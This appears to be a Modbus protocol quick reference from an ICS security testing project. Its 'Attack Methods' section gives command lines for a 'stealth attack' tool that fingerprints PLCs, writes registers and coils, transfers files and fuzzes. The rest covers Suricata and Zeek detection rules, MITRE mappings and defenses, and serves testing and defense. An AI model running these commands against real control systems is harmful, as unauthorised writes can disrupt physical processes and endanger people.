# Modbus Protocol Quick Reference

## Protocol Overview
- **Protocol**: Modbus TCP/RTU/ASCII
- **Port**: TCP/502 (Modbus TCP), Serial RS-232/RS-485 (RTU/ASCII)
- **OSI Layer**: Application Layer (TCP) / Data Link Layer (RTU/ASCII)
- **Specification**: Modbus Application Protocol v1.1b3
- **Primary Use**: PLC/RTU communication, SCADA systems

## Attack Tool Reference
**Implementation**: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
**Version**: 3.0
**Testing Guide**: `tools/modbus-stealth-toolkit/TESTING.md`

## Function Codes

### Read Operations
| Code | Function | MITRE | Tool Method |
|------|----------|-------|-------------|
| 0x01 | Read Coils | T0801, T0861 | `read_coils()` |
| 0x02 | Read Discrete Inputs | T0801, T0861 | `read_discrete_inputs()` |
| 0x03 | Read Holding Registers | T0801, T0861 | `read_registers()` |
| 0x04 | Read Input Registers | T0801, T0861 | `read_input_registers()` |
| 0x14 | Read File Record | T0802, T0861 | `read_file_record()` |
| 0x18 | Read FIFO Queue | T0801 | N/A |

### Write Operations
| Code | Function | MITRE | Tool Method |
|------|----------|-------|-------------|
| 0x05 | Write Single Coil | T0855, T0836 | `write_coil()` |
| 0x06 | Write Single Register | T0855, T0836 | `write_register()` |
| 0x0F | Write Multiple Coils | T0855, T0836 | `write_multiple_coils()` |
| 0x10 | Write Multiple Registers | T0855, T0836 | `write_registers()` |
| 0x15 | Write File Record | T0873, T0871 | `write_file_record()` |
| 0x16 | Mask Write Register | T0855, T0836 | `mask_write_register()` |
| 0x17 | Read/Write Multiple Registers | T0855, T0836 | `read_write_multiple_registers()` |

### Diagnostic Operations
| Code | Function | MITRE | Tool Method |
|------|----------|-------|-------------|
| 0x07 | Read Exception Status | T0801 | N/A |
| 0x08 | Diagnostics | T0801, T0888 | `diagnostics()` |
| 0x0B | Get Comm Event Counter | T0801, T0868 | N/A |
| 0x0C | Get Comm Event Log | T0802 | N/A |
| 0x11 | Report Server ID | T0888, T0868 | `report_server_id()` |
| 0x2B | Encapsulated Interface Transport | T0888 | N/A |

## Packet Structure

### Modbus TCP (MBAP Header + PDU)
```
MBAP Header (7 bytes):
  Transaction ID: 2 bytes (0x0000-0xFFFF)
  Protocol ID: 2 bytes (0x0000 = Modbus)
  Length: 2 bytes (Unit ID + PDU length)
  Unit ID: 1 byte (slave address)

PDU:
  Function Code: 1 byte
  Data: variable (max 253 bytes)
```
**Reference**: `modbus_stealth_attack.py:138-147`

### Modbus RTU (Serial)
```
Frame:
  Unit ID: 1 byte
  Function Code: 1 byte
  Data: variable
  CRC-16: 2 bytes (computed over Unit ID + FC + Data)
```
**CRC Calculation**: `modbus_stealth_attack.py:162-172`

### Modbus ASCII (Serial)
```
Frame:
  Start: 1 byte (0x3A ':')
  Unit ID: 2 ASCII chars
  Function Code: 2 ASCII chars
  Data: variable ASCII hex
  LRC: 2 ASCII chars
  End: 2 bytes (0x0D 0x0A '\r\n')
```
**LRC Calculation**: `modbus_stealth_attack.py:182-187`

## Exception Codes
| Code | Exception | Description |
|------|-----------|-------------|
| 0x01 | Illegal Function | Function code not supported |
| 0x02 | Illegal Data Address | Invalid register/coil address |
| 0x03 | Illegal Data Value | Invalid value in request |
| 0x04 | Server Device Failure | Unrecoverable error |
| 0x05 | Acknowledge | Long operation in progress |
| 0x06 | Server Device Busy | Retry request later |
| 0x08 | Memory Parity Error | Memory error detected |
| 0x0A | Gateway Path Unavailable | Gateway misconfigured |
| 0x0B | Gateway Target No Response | Target device offline |

**Reference**: `modbus_stealth_attack.py:103-113`

## Attack Methods

### 1. Reconnaissance
```bash
# Device discovery and fingerprinting
python3 modbus_stealth_attack.py --target 192.168.1.10 --mode fingerprint

# Report Server ID (FC 0x11)
python3 modbus_stealth_attack.py --target 192.168.1.10 --function 0x11
```
**MITRE**: T0888 (Remote System Discovery), T0801 (Monitor Process State)

### 2. Register Manipulation
```bash
# Write single register (FC 0x06)
python3 modbus_stealth_attack.py --target 192.168.1.10 --write-register 1000 --value 5000

# Write multiple registers (FC 0x10)
python3 modbus_stealth_attack.py --target 192.168.1.10 --write-multiple --start 1000 --values 100,200,300

# Mask write register (FC 0x16) - bitwise AND/OR
python3 modbus_stealth_attack.py --target 192.168.1.10 --mask-write 1000 --and-mask 0xFF00 --or-mask 0x00AA
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
**Tool Reference**: `modbus_stealth_attack.py:900-950`

### 3. File Transfer Operations
```bash
# Read file record (FC 0x14)
python3 modbus_stealth_attack.py --target 192.168.1.10 --read-file --file-number 1 --record-number 0

# Write file record (FC 0x15)
python3 modbus_stealth_attack.py --target 192.168.1.10 --write-file --file-number 1 --record-number 0 --data <hex>
```
**MITRE**: T0802 (Automated Collection), T0873 (Project File Infection)
**Tool Reference**: `modbus_stealth_attack.py:952-1050`

### 4. Coil Manipulation
```bash
# Write single coil (FC 0x05)
python3 modbus_stealth_attack.py --target 192.168.1.10 --write-coil 100 --value 1

# Write multiple coils (FC 0x0F)
python3 modbus_stealth_attack.py --target 192.168.1.10 --write-multiple-coils --start 100 --values 1,0,1,0,1
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)

### 5. Protocol Fuzzing
```bash
# Fuzz Modbus function codes
python3 modbus_stealth_attack.py --target 192.168.1.10 --mode fuzz --fuzz-type function-codes

# Fuzz register addresses
python3 modbus_stealth_attack.py --target 192.168.1.10 --mode fuzz --fuzz-type registers
```
**MITRE**: T0855 (Unauthorized Command Message)
**Tool Reference**: `modbus_stealth_attack.py:1500-1600`

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/ics_malware_detection.rules`

```
# Unauthorized write operations (FC 0x05, 0x06, 0x0F, 0x10, 0x15, 0x16, 0x17)
alert tcp any any -> any 502 (msg:"ICS: Modbus Unauthorized Write Command"; \
    content:"|00 00|"; offset:2; depth:2; \
    byte_test:1,&,0x80,7,relative; byte_test:1,>=,5,0,relative; \
    byte_test:1,<=,23,0,relative; \
    classtype:industrial-protocol; sid:400001; rev:2;)

# File transfer operations (FC 0x14, 0x15)
alert tcp any any -> any 502 (msg:"ICS: Modbus File Transfer Operation"; \
    content:"|00 00|"; offset:2; depth:2; \
    pcre:"/\x00\x00.{2}[\x14\x15]/s"; \
    classtype:industrial-protocol; sid:400006; rev:1;)

# Mask write register (FC 0x16)
alert tcp any any -> any 502 (msg:"ICS: Modbus Mask Write Register"; \
    content:"|00 00|"; offset:2; depth:2; content:"|16|"; offset:7; depth:1; \
    classtype:industrial-protocol; sid:400007; rev:1;)
```

### Zeek Detection
**File**: `configs/zeek/ics_detection.zeek`

```zeek
# Modbus write operation tracking
event modbus_write_request(c: connection, headers: ModbusHeaders, reg: count, val: count) {
    local severity = "HIGH";
    if (reg >= 1000 && reg <= 2000) {
        severity = "CRITICAL";  # Critical control registers
    }
    
    Log::write(ICS::LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $protocol="Modbus", $operation="WRITE_REGISTER",
        $severity=severity, $details=fmt("Register: %d, Value: %d", reg, val)]);
}

# Modbus file transfer detection (FC 0x14-0x17)
event modbus_message(c: connection, headers: ModbusHeaders, is_orig: bool) {
    if (headers$function_code >= 0x14 && headers$function_code <= 0x17) {
        Log::write(ICS::LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $protocol="Modbus", $operation="FILE_TRANSFER",
            $severity="CRITICAL", $details=fmt("FC: 0x%02x", headers$function_code)]);
    }
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: Report Server ID (0x11), Diagnostics (0x08)
- **T0801**: Monitor Process State
  - Methods: Read Coils/Registers (0x01-0x04)
- **T0868**: Detect Operating Mode
  - Methods: Get Comm Event Counter (0x0B)

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: Write File Record (0x15)

### Persistence (Tactic: TA0110)
- **T0873**: Project File Infection
  - Methods: Write File Record (0x15)

### Impact (Tactic: TA0105)
- **T0855**: Unauthorized Command Message
  - Methods: All write operations (0x05, 0x06, 0x0F, 0x10, 0x16, 0x17)
- **T0836**: Modify Parameter
  - Methods: Write Register/Coil (0x05, 0x06, 0x0F, 0x10)

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: Read File Record (0x14), Read FIFO (0x18)
- **T0861**: Point & Tag Identification
  - Methods: Read operations (0x01-0x04, 0x14)

## Common Vulnerabilities

### Unauthenticated Access
- **Issue**: No authentication in standard Modbus protocol
- **Impact**: Any network-accessible device can be manipulated
- **Mitigation**: Network segmentation, firewall rules, Modbus security extensions

### Lack of Encryption
- **Issue**: All traffic sent in cleartext
- **Impact**: Easy protocol analysis and replay attacks
- **Mitigation**: VPN tunnels, TLS wrappers, secure Modbus variants

### No Command Authorization
- **Issue**: No distinction between read/write privileges
- **Impact**: Any connected client can issue write commands
- **Mitigation**: Application-level access control, protocol gateways

### Replay Attacks
- **Issue**: No transaction authentication or sequence numbers (RTU/ASCII)
- **Impact**: Captured commands can be replayed
- **Mitigation**: Application-level sequence tracking, time-based validation

### Broadcast Manipulation
- **Issue**: Unit ID 0 broadcasts to all devices
- **Impact**: Single command affects multiple devices
- **Mitigation**: Disable broadcast if not required, monitor for broadcast usage

## Defense Recommendations

### Network Layer
1. **Segmentation**: Isolate Modbus networks from IT networks
2. **Firewall Rules**: Restrict TCP/502 to authorized hosts only
3. **IDS/IPS**: Deploy Suricata rules for anomaly detection
4. **Network Monitoring**: Zeek scripts for protocol analysis

### Application Layer
1. **Read-Only Mode**: Configure PLCs for read-only where possible
2. **Write Protection**: Enable hardware write protection on critical devices
3. **Register Access Control**: Implement address range restrictions
4. **Rate Limiting**: Limit request frequency per client

### Operational
1. **Baseline Traffic**: Establish normal communication patterns
2. **Change Management**: Document all legitimate write operations
3. **Audit Logging**: Log all Modbus transactions with timestamps
4. **Incident Response**: Define procedures for anomalous activity

## Protocol Limits
- **Max PDU Size**: 253 bytes (TCP), 252 bytes (RTU)
- **Max Registers per Read**: 125 registers (250 bytes)
- **Max Registers per Write**: 123 registers (246 bytes)
- **Max Coils per Read**: 2000 coils
- **Max Coils per Write**: 1968 coils
- **Address Range**: 0x0000-0xFFFF (65536 addresses)

**Reference**: `modbus_stealth_attack.py:78-99`

## Testing Checklist

### Reconnaissance Testing
- [ ] Device discovery and enumeration
- [ ] Server ID fingerprinting (FC 0x11)
- [ ] Register address space mapping
- [ ] Exception code response analysis
- [ ] Diagnostic function testing (FC 0x08)

### Write Testing
- [ ] Single register write (FC 0x06)
- [ ] Multiple register write (FC 0x10)
- [ ] Single coil write (FC 0x05)
- [ ] Multiple coil write (FC 0x0F)
- [ ] Mask write register (FC 0x16)
- [ ] Read/write multiple (FC 0x17)

### Advanced Testing
- [ ] File record read/write (FC 0x14, 0x15)
- [ ] Protocol fuzzing
- [ ] Replay attack validation
- [ ] Broadcast command testing
- [ ] Exception handling analysis

### Detection Validation
- [ ] Suricata rule triggering
- [ ] Zeek log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- Modbus Application Protocol Specification v1.1b3
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
- Detection Rules: `configs/suricata_rules/ics_malware_detection.rules`
- Zeek Monitor: `configs/zeek/ics_detection.zeek`
- Testing Guide: `tools/modbus-stealth-toolkit/TESTING.md`
